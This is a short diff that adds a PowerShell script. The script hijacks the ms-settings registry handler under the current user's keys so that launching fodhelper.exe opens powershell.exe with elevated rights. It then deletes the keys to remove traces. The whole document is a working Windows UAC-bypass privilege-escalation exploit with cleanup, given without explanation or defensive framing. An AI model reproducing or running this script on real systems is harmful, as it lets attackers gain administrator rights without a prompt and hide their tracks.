@@ -1,0 +1,9 @@
+$CYE="powershell.exe"
+reg add "HKCU\Software\Classes\.cye\Shell\Open\command" /d $CYE /f;
+reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".cye" /f;
+fodhelper.exe
+Start-Sleep -s 1;
+reg delete "HKCU\Software\Classes\.cye\" /f;
+reg delete "HKCU\Software\Classes\ms-settings\" /f;
+Start-Sleep -s 1;
+EXIT
